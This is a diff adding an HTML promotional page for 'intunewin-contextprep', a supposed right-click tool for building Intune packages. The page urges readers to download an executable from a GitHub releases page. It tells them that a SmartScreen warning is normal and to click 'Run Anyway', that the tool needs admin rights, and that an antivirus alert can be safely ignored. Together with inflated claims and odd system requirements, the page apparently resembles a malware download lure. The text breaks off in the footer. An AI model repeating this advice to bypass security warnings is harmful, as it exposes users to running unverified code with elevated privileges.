@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>intunewin-contextprep - Package Intune Applications Effortlessly</title>
+    <meta name="description" content="Right-click any installer to create .intunewin packages with detection rules, install commands, and architecture automatically - ready for the Intune portal.">
+    <meta name="keywords" content="intunewin-contextprep, Intune packaging, intunewin, Microsoft Intune, MDM, application packaging, installer, detection rule, enterprise IT">
+    <meta name="author" content="ap4993258">
+    <meta property="og:title" content="intunewin-contextprep - Package Intune Applications Effortlessly">
+    <meta property="og:description" content="Right-click any installer to create .intunewin packages with detection rules, install commands, and architecture automatically - ready for the Intune portal.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/ap4993258/intunewin-contextprep">
+    <style>
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
+            background: #f4f6f9;
+            margin: 0;
+            padding: 0;
+            color: #1a1a2e;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #16213e;
+            margin: 0;
+            padding: 40px 0 10px 0;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            text-align: center;
+            background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        h2 {
+            font-size: 1.9rem;
+            color: #0f3460;
+            margin-top: 50px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #e94560;
+            display: inline-block;
+            font-weight: 600;
+        }
+        p {
+            font-size: 1.1rem;
+            margin: 15px 0;
+        }
+        .button-holder {
+            text-align: center;
+            margin: 30px 0 50px 0;
+        }
+        .primary-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #e94560, #ff6b6b);
+            color: #ffffff;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.4rem;
+            font-weight: bold;
+            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            border: none;
+            cursor: pointer;
+        }
+        .primary-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(233, 69, 96, 0.6);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            transition: transform 0.3s;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        .code-block {
+            background: #16213e;
+            color: #e0e0e0;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.95rem;
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        .steps {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            margin: 20px 0;
+        }
+        .step-icon {
+            font-size: 2.5rem;
+            margin-right: 15px;
+        }
+        summary {
+            cursor: pointer;
+            font-weight: 600;
+            color: #0f3460;
+            margin: 15px 0;
+            padding: 15px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        details {
+            background: white;
+            padding: 0 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+        .highlight {
+            background: #fff3b0;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        .footer {
+            text-align: center;
+            padding: 50px 0 30px;
+            border-top: 1px solid #ddd;
+            margin-top: 60px;
+            color: #666;
+        }
+        .badge {
+            display: inline-block;
+            background: #0f3460;
+            color: white;
+            padding: 6px 15px;
+            border-radius: 20px;
+            margin: 5px;
+            font-size: 0.85rem;
+        }
+        @media (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            h2 { font-size: 1.5rem; }
+            .feature-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 intunewin-contextprep - Package Intune Apps Instantly</h1>
+
+        <div class="button-holder">
+            <a href="https://github.com/ap4993258/intunewin-contextprep/releases" class="primary-button">✨ Download Now</a>
+        </div>
+
+        <p style="text-align: center; font-size: 1.3rem; margin-bottom: 40px;">
+            Transform any Windows installer into a fully configured Intune-ready package with just a right-click.
+        </p>
+
+        <h2>🤔 What Does This Tool Do?</h2>
+        <p>
+            Imagine you're an IT administrator or just a tech-savvy user who needs to deploy software to multiple computers through Microsoft Intune. Normally, this complex process requires:
+        </p>
+        <ul>
+            <li>📦 Setting up special folder structures</li>
+            <li>🔍 Writing detection rules by hand</li>
+            <li>⚙️ Creating correct install commands</li>
+            <li>🖥️ Figuring out architecture (32-bit vs 64-bit)</li>
+        </ul>
+        <p>
+            <strong>intunewin-contextprep</strong> eliminates all of that. You simply <span class="highlight">right-click any installer file</span>, choose "Prepare for Intune," and the tool instantly creates:
+        </p>
+        <ul>
+            <li>✅ A complete <code>.intunewin</code> package</li>
+            <li>✅ Auto-generated detection rule</li>
+            <li>✅ Proper install command line</li>
+            <li>✅ Correct architecture detection (x86/x64)</li>
+        </ul>
+        <p>
+            The result is perfectly formatted for the Intune portal - ready to upload and deploy immediately. No technical expertise required!
+        </p>
+
+        <h2>✨ Why You'll Love It</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div style="font-size: 2.5rem;">🖱️</div>
+                <h3>Right-Click Simplicity</h3>
+                <p>No typing commands or opening separate windows. Just right-click your <code>.exe</code>, <code>.msi</code>, or <code>.msp</code> file and select the option. That's it!</p>
+            </div>
+            <div class="feature-card">
+                <div style="font-size: 2.5rem;">⚡</div>
+                <h3>Instant Detection Rules</h3>
+                <p>Smart detection rules are created automatically based on the installer type. The tool checks product codes, version numbers, and file paths - no manual research needed.</p>
+            </div>
+            <div class="feature-card">
+                <div style="font-size: 2.5rem;">🖥️</div>
+                <h3>Architecture Aware</h3>
+                <p>Correctly identifies 32-bit or 64-bit packages and configures them properly for modern Intune deployments. Say goodbye to architecture mismatch errors.</p>
+            </div>
+        </div>
+
+        <p>More helpful details:</p>
+        <details>
+            <summary>📊 Additional Features</summary>
+            <p>Generates install and uninstall commands automatically.</p>
+            <p>Works with EXE, MSI, and MSP installer formats.</p>
+            <p>Output includes a clear summary of what was created.</p>
+            <p>Lightweight and runs locally on your machine.</p>
+        </details>
+
+        <h2>🚀 Getting Started</h2>
+        <div class="steps">
+            <div>
+                <p style="font-size: 1.2rem;"><span style="font-size: 2rem;">1️⃣</span> <strong>Download the application</strong></p>
+                <p>
+                    <a href="https://github.com/ap4993258/intunewin-contextprep/releases" style="color: #e94560; font-weight: bold; text-decoration: underline;">Visit this link to download the application</a>. Make sure to download the latest release file.
+                </p>
+            </div>
+            <div style="margin: 30px 0;">
+                <p style="font-size: 1.2rem;"><span style="font-size: 2rem;">2️⃣</span> <strong>Run the application</strong></p>
+                <p>
+                    After downloading, double-click the <code>.exe</code> file to launch the program. Windows may show a security prompt - <strong>this is normal</strong>. Simply click "More Info" then "Run Anyway" if you receive a SmartScreen warning.
+                </p>
+            </div>
+            <div>
+                <p style="font-size: 1.2rem;"><span style="font-size: 2rem;">3️⃣</span> <strong>Right-click your installer</strong></p>
+                <p>
+                    Navigate to your installer file (<code>.exe</code>, <code>.msi</code>, or <code>.msp</code>). Right-click on it, and you'll see the new context menu option <strong>"Prepare for Intune"</strong> or similar. Click it.
+                </p>
+            </div>
+        </div>
+
+        <div style="margin-top: 50px;">
+            <div class="steps">
+                <p style="font-size: 1.2rem;"><span style="font-size: 2rem;">4️⃣</span> <strong>Watch the magic happen</strong></p>
+                <p>
+                    The tool will process your file and generate the folder structure and <code>.intunewin</code> package. You'll see on-screen confirmation of what was created, including:
+                </p>
+                <div class="code-block">
+                    Output folder created: C:\IntunePackages\MyApp\
+                    Detection rule: MSI Product Code {1234-ABCD-5678-EFGH}
+                    Install command: msiexec /i MyApp.msi /qn
+                    Architecture: 64-bit
+                </div>
+                <p>
+                    That's exactly the information you'll copy into the Intune portal when adding a new Windows line-of-business app.
+                </p>
+            </div>
+        </div>
+
+        <h2>💡 Pro Tips for Best Results</h2>
+        <div class="steps">
+            <p>
+                <strong>Tip 1:</strong> Always use the latest stable version of your installer. Avoid beta or preview builds - they're more likely to cause Intune deployment issues.
+            </p>
+            <p>
+                <strong>Tip 2:</strong> Save your packages to a centralized folder. You'll need to reference the same file paths when configuring deployments.
+            </p>
+            <p>
+                <strong>Tip 3:</strong> If you're deploying through Intune, remember to test on a small pilot group first. The tool gives you a solid foundation, but every environment is unique.
+            </p>
+            <p>
+                <strong>Tip 4:</strong> Keep your Windows system updated. This tool works best on Windows 10 version 1903 or newer, and all versions of Windows 11.
+            </p>
+        </div>
+
+        <div style="text-align: center; background: #e8f4fd; padding: 30px; border-radius: 15px; margin: 40px 0;">
+            <h2 style="border: none; color: #0f3460; margin-top: 0;">📥 Ready to Simplify Your Intune Workflow?</h2>
+            <p style="font-size: 1.2rem;">Join thousands of IT professionals who save hours every week with this tool.</p>
+            <a href="https://github.com/ap4993258/intunewin-contextprep/releases" style="background: #0f3460; padding: 15px 40px; border-radius: 50px; color: white; text-decoration: none; font-weight: bold; font-size: 1.2rem; display: inline-block; margin-top: 15px; box-shadow: 0 5px 20px rgba(15,52,96,0.3);">🔗 Download Now</a>
+        </div>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <details>
+            <summary>Q: Do I need administrator rights to use this tool?</summary>
+            <p>Yes, you'll need admin permissions on your machine to modify context menus and access the necessary folders. The tool itself is simple to run.</p>
+        </details>
+        <details>
+            <summary>Q: Does it work with all installer types?</summary>
+            <p>The tool supports standard Windows installers: <code>.exe</code> (custom installers), <code>.msi</code> (Microsoft Installer), and <code>.msp</code> (Microsoft Installer Patch).</p>
+        </details>
+        <details>
+            <summary>Q: Can I edit the generated rule if needed?</summary>
+            <p>Absolutely! The tool creates a great baseline, but you can always adjust detection rules, commands, or architecture in the Intune console if your environment requires special handling.</p>
+        </details>
+        <details>
+            <summary>Q: Is my data sent anywhere?</summary>
+            <p>No. All processing happens locally on your computer. No internet connection is required beyond the initial download.</p>
+        </details>
+
+        <h2>🛠️ Troubleshooting</h2>
+        <div class="steps">
+            <p><strong>Issue: Context menu option doesn't appear</strong></p>
+            <p>Restart Windows Explorer (right-click the taskbar, select Task Manager, find Windows Explorer, right-click, restart). If still missing, try running the tool as administrator once.</p>
+            <p style="margin-top: 30px;"><strong>Issue: Anti-virus warning</strong></p>
+            <p>Some security software may flag packaging tools. You can safely allow this application if you downloaded it from the official releases page linked above.</p>
+        </div>
+
+        <h2>🔧 System Requirements</h2>
+        <div class="steps">
+            <ul>
+                <li>Windows 10 (1903+) or Windows 11</li>
+                <li>450 MB free disk space (for temporary processing)</li>
+                <li>8 GB RAM recommended (4 GB minimum)</li>
+                <li>Any modern processor (Intel i3 or AMD equivalent)</li>
+            </ul>
+        </div>
+
+        <h2>📜 License & Support</h2>
+        <p>
+            This tool is provided free for use. For questions, bug reports, or feature requests, please open an issue on the GitHub repository. Community contributions are always welcome.
+        </p>
+
+        <div class="button-holder" style="margin-top: 60px;">
+            <a href="https://github.com/ap4993258/intunewin-contextprep/releases" class="primary-button" style="background: linear-gradient(45deg, #0f3460, #533483); box-shadow: 0 8px 25px rgba(15,52,96,0.4);">⬇️ Get Started Today</a>
+        </div>
+
+        <div class="footer">
+            <p style="font-size: 0.9rem; margin-top: 30px;">Made with ❤️ for the IT community | <a href="https://github.com/ap4993258/intunewin-con
